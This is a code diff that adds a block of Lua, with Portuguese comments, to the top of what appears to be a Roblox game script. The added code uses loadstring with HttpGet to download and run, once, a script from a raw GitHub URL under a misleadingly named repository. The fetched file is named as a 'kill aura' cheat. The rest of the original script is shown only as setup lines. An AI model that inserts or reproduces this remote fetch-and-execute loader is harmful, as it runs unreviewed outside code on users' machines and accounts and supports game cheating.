@@ -1,3 +1,18 @@
+
+-- Verificar se o script já foi executado
+local executed = false
+
+-- Função para executar o script uma única vez
+local function executeOnce()
+    if not executed then
+        executed = true  -- Marca como executado
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/DATEDATEDATEDATEDATE/Encrypted_AutoFarm_LanderSecurity_ProxyLayer_PasswordVault_Advanced_IPS_FoxTekScripts_Deployment_V2/refs/heads/main/KILLAURAsuportesGuerraSUB.lua"))()
+    end
+end
+
+-- Chama a função para executar o script
+executeOnce()
+
 -- Variáveis iniciais
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
